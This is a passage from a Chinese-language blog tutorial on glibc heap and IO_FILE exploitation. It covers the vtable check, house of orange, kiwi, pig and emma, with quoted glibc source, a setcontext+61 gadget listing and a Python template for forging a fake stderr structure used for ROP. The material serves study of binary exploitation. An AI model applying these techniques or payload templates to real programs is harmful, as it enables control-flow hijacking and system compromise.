class="hljs-comment">     need to accept foreign vtables because there is always a</span><br><span class="hljs-comment">     possibility that FILE * objects are passed across the linking</span><br><span class="hljs-comment">     boundary.  */</span><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* !SHARED */</span></span><br>  <span class="hljs-comment">/* We cannot perform vtable validation in the static dlopen case</span><br><span class="hljs-comment">     because FILE * handles might be passed back and forth across the</span><br><span class="hljs-comment">     boundary.  Therefore, we disable checking in this case.  */</span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>对上述检查，仅限于重构或是动态链接库中 vtable，否则将会触发报错并关闭进程。</p>
<p>因此自 GLIBC2.24 以来，对虚表的伪造就仅限于在对应的地址段内进行了。</p>
<h1 id="高版本下的调用链思考"><a href="#高版本下的调用链思考" class="headerlink" title="高版本下的调用链思考"></a>高版本下的调用链思考</h1><p>再接下来的版本里，往往这种利用的对抗转为了调用链的发现和利用。正如上文所说，vtable 被限制到了固定的内存段，但是将 vtable 改为其他合法的跳转表，并劫持其他跳转表中会使用的函数指针即可。</p>
<p>而在后来的版本中，官方又将函数指针删除，转为对应的固定函数，因此调用链被消解，但又有大佬找到了新的调用链。</p>
<p>一般来说，IO_FILE 的利用集中在 GLIBC2.31 之后，尤其是在 GLIBC2.34 中删除了 <code>__free_hook</code> 和 <code>__malloc_hook</code> 的情况下。</p>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>我自己最早听说过的 IO 利用就来自于该操作。其出现于 2016 年的 HITCON，距本文撰写已经有六年左右了。该利用本身指的是 “在没有 free 的情况下获得被释放的内存块”，但是题目最终却需要结合 IO_FILE 完成利用，因此本节的重点也放在后半部分。</p>
<p>在当时的环境中，尚且使用 GLIBC2.23，因此劫持虚表的操作是可行的。</p>
<p>通过 <code>unsortedbin attack</code> 能将 <code>main_arena+88/96</code> 写入任意地址的操作，将其写入到 <code>_IO_list_all</code> 中，相当于伪造链表的操作了。</p>
<p>而该地址作为新的 <code>_IO_FILE_plus</code> 被使用时，其 <code>_chain</code> 字段正好对应到了 <code>smallbin[4]</code> ，因此只要将合适的内存块伪造好数据并放入其中，就能令 <code>_chain</code> 指向的下一个 <code>_IO_FILE_plus</code> 由攻击者控制，则 vtable 就能够指向任意地址了。</p>
<p>至于触发调用链：<code>malloc() -&gt; malloc_printerr() -&gt; __libc_message() -&gt; abort() -&gt; fflush() -&gt; _IO_flush_all_lockp() -&gt; _IO_new_file_overflow()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>            &#123;<br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* place chunk in bin */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>由于这个步骤过于一气呵成了，因此在这里做一个简单的解释：</p>
<p>在调用 malloc 时，会检查 Bins 结构，并发现 unsortedbin 中存在 chunk，因此开始遍历。首先在第一次遍历时会将原本的 Top chunk 取出，从而完成 unsortedbin attack：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>

<p>并且在这之后，会将这块内存放入 smallbin 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>    &#123;<br>      victim_index = smallbin_index (size);<br>      bck = bin_at (av, victim_index);<br>      fwd = bck-&gt;fd;<br>    &#125;<br>......<br>  victim-&gt;bk = bck;<br>  victim-&gt;fd = fwd;<br>  fwd-&gt;bk = victim;<br>  bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure>

<p>但由于该循环的条件仍然满足，即堆管理器认为 unsortedbin 中还有内容，因此进入第二次遍历：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>  &#123;<br>    bck = victim-&gt;bk;<br>    <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>        || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                       chunk2mem (victim), av);<br></code></pre></td></tr></table></figure>

<p>而在这一次中，由于本次取出的值实则为 <code>_IO_list_all-0x10</code> ，并未伪造对应的 size 等字段，因此会触发 <code>malloc_printerr</code> 从而进入上文所述的调用链。</p>
<p>由于 <code>unsortedbin attack</code> 的关系，<code>_IO_list_all</code> 被改为了 unsortedbin ，而 <code>_chain</code> 字段正好对应到了 <code>smallbin[0x60]</code> ，而该处正好就是上一次被放入的 top chunk，因此在上次更新时布置好 vtable 即可劫持控制流。</p>
<h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>思路和 orange 的差别在于，orange 尝试直接伪造整个 vtable，而 kiwi 只希望修改 vtable 中的某一项为 setcontext+61 来调整 rsp 和 rcx 的值来劫持控制流。</p>
<p>调用链：<code>assert-&gt;malloc_assert-&gt;fflush(stderr)-&gt;_IO_file_sync</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>(<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>           __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           file, line,<br>           function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           assertion);<br>fflush (<span class="hljs-built_in">stderr</span>);<br><span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该调用链会读取 stderr 的 IO_FILE 中的 vtable 完成利用，因此需要伪造其 vtable 中的某一项。</p>
<p>不过笔者尝试在 Ubuntu16.04 和 Ubuntu18.04 以及 Ubuntu20.04 上测试，发现 vtable 所属的内存段都没有可写权限，似乎这个利用只存在于早期版本，在之后的小版本更新后就被修复了。</p>
<blockquote>
<p>GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.<br>Copyright (C) 2020 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.<br>There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A<br>PARTICULAR PURPOSE.<br>Compiled by GNU CC version 9.4.0.<br>libc ABIs: UNIQUE IFUNC ABSOLUTE</p>
</blockquote>
<p>不过该方法的利用链和利用技巧却在之后的其他利用手段中被常常使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;setcontext+<span class="hljs-number">61</span>&gt;:    mov    rsp,QWORD PTR [rdx+<span class="hljs-number">0xa0</span>]<br>&lt;setcontext+<span class="hljs-number">68</span>&gt;:    mov    rbx,QWORD PTR [rdx+<span class="hljs-number">0x80</span>]<br>&lt;setcontext+<span class="hljs-number">75</span>&gt;:    mov    rbp,QWORD PTR [rdx+<span class="hljs-number">0x78</span>]<br>&lt;setcontext+<span class="hljs-number">79</span>&gt;:    mov    r12,QWORD PTR [rdx+<span class="hljs-number">0x48</span>]<br>&lt;setcontext+<span class="hljs-number">83</span>&gt;:    mov    r13,QWORD PTR [rdx+<span class="hljs-number">0x50</span>]<br>&lt;setcontext+<span class="hljs-number">87</span>&gt;:    mov    r14,QWORD PTR [rdx+<span class="hljs-number">0x58</span>]<br>&lt;setcontext+<span class="hljs-number">91</span>&gt;:    mov    r15,QWORD PTR [rdx+<span class="hljs-number">0x60</span>]<br>&lt;setcontext+<span class="hljs-number">95</span>&gt;:    test   DWORD PTR fs:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>&lt;setcontext+<span class="hljs-number">107</span>&gt;:    je     <span class="hljs-number">0x7ffff7e31156</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>-&gt;<br>&lt;setcontext+<span class="hljs-number">294</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="hljs-number">0xa8</span>]<br>&lt;setcontext+<span class="hljs-number">301</span>&gt;:    push   rcx<br>&lt;setcontext+<span class="hljs-number">302</span>&gt;:    mov    rsi,QWORD PTR [rdx+<span class="hljs-number">0x70</span>]<br>&lt;setcontext+<span class="hljs-number">306</span>&gt;:    mov    rdi,QWORD PTR [rdx+<span class="hljs-number">0x68</span>]<br>&lt;setcontext+<span class="hljs-number">310</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="hljs-number">0x98</span>]<br>&lt;setcontext+<span class="hljs-number">317</span>&gt;:    mov    r8,QWORD PTR [rdx+<span class="hljs-number">0x28</span>]<br>&lt;setcontext+<span class="hljs-number">321</span>&gt;:    mov    r9,QWORD PTR [rdx+<span class="hljs-number">0x30</span>]<br>&lt;setcontext+<span class="hljs-number">325</span>&gt;:    mov    rdx,QWORD PTR [rdx+<span class="hljs-number">0x88</span>]<br>&lt;setcontext+<span class="hljs-number">332</span>&gt;:    xor    eax,eax<br>&lt;setcontext+<span class="hljs-number">334</span>&gt;:    ret<br></code></pre></td></tr></table></figure>

<p>假设现在我们能令 rdx 指向自己伪造的某个结构体，那么就能够在上述代码段中设定所有通用寄存器的值。同时可以注意到，rcx 寄存器用以设定该函数的返回值，其被储存在了 <code>[rdx+0xa8]</code> 。</p>
<h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><p>在只有 calloc 的情况下，通过 tcachebin 完成的一种利用技巧。</p>
<p>其触发函数只有一个：<code>_IO_str_overflow</code> ，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF)<br>    <span class="hljs-keyword">return</span> EOF;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-type">char</span> *new_buf;<br>    <span class="hljs-type">char</span> *old_buf = fp-&gt;_IO_buf_base;<br>    <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>    <span class="hljs-type">size_t</span> new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>        <span class="hljs-keyword">return</span> EOF;<br>    new_buf = <span class="hljs-built_in">malloc</span> (new_size);<span class="hljs-comment">//-------house of pig:get chunk from tcache</span><br>    <span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-comment">/*      __ferror(fp) = 1; */</span><br>        <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (old_buf)<br>    &#123;<br>        <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);<br>        <span class="hljs-comment">//-------house of pig:copy /bin/sh and system to _free_hook</span><br>        <span class="hljs-built_in">free</span> (old_buf);        <span class="hljs-comment">//-------house of pig:getshell</span><br>        <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span><br>        fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>此段代码调用 malloc 、memcpy 和 free ，触发关键是在申请内存时已向 tcachebin 中放入 <code>__free_hook</code> ，而调用 memcpy 时向其中写入其他函数地址，然后在 free 时触发劫持。</p>
<p>此项利用和上面又有些许不同的是，我们可以直接伪造整个 IO_FILE ，但将其 vtable 指向 <code>_IO_str_jumps</code> 而不需要修改跳转表本身，由于<code>_IO_str_jumps</code> 是一个合法的跳转表，因此能够正常被使用而不会触发异常。</p>
<p>调用 <code>_IO_flush_all_lockp</code> 时可以触发该函数，一般如下任意一个都行：</p>
<ul>
<li><ol>
<li>当 libc 执行abort流程时。</li>
</ol>
</li>
<li><ol start="2">
<li>程序显式调用 exit 。</li>
</ol>
</li>
<li><ol start="3">
<li>程序能通过主函数返回。</li>
</ol>
</li>
</ul>
<blockquote>
<p>但这需要 <code>__free_hook</code> ，如您所见，自 GLIBC2.34 以来就不再使用了。不过如果能写 got 表，在之后还是可以尝试利用的。</p>
</blockquote>
<p>常用的伪造 stderr 模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># magic_gadget：mov rdx, rbx ; mov rsi, r12 ; call qword ptr [r14 + 0x38]</span><br>fake_stderr = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># _IO_write_ptr</span><br>fake_stderr += p64(<span class="hljs-number">0</span>) + p64(fake_stderr_addr+<span class="hljs-number">0xf0</span>) + p64(fake_stderr_addr+<span class="hljs-number">0x108</span>)<br>fake_stderr = fake_stderr.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_stderr += p64(libc.sym[<span class="hljs-string">&#x27;_IO_stdfile_2_lock&#x27;</span>]) <span class="hljs-comment"># _lock</span><br>fake_stderr = fake_stderr.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># srop</span><br>fake_stderr += p64(rop_address + <span class="hljs-number">0x10</span>) + p64(ret_addr) <span class="hljs-comment"># rsp rip</span><br>fake_stderr = fake_stderr.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_stderr += p64(libc.sym[<span class="hljs-string">&#x27;_IO_str_jumps&#x27;</span>] - <span class="hljs-number">0x20</span>)<br>fake_stderr += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>fake_stderr += p64(magic_gadget) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># r14 r14+8</span><br>fake_stderr += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_stderr += p64(libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">61</span>) <span class="hljs-comment"># r14 + 0x38</span><br></code></pre></td></tr></table></figure>

<h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><p>在 GLIBC2.34 以后没有了 <code>__free_hook</code> 和 <code>__malloc_hook</code> 等极其方便的利用，因此出现了一个新的利用链，主要和 <code>_IO_cookie_jumps</code> 有关。</p>
<p>但其本质似乎更类似于一个 <code>__free_hook</code> 和 <code>__malloc_hook</code> 的代替品：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_read (FILE *fp, <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (read_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (read_cb == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> read_cb 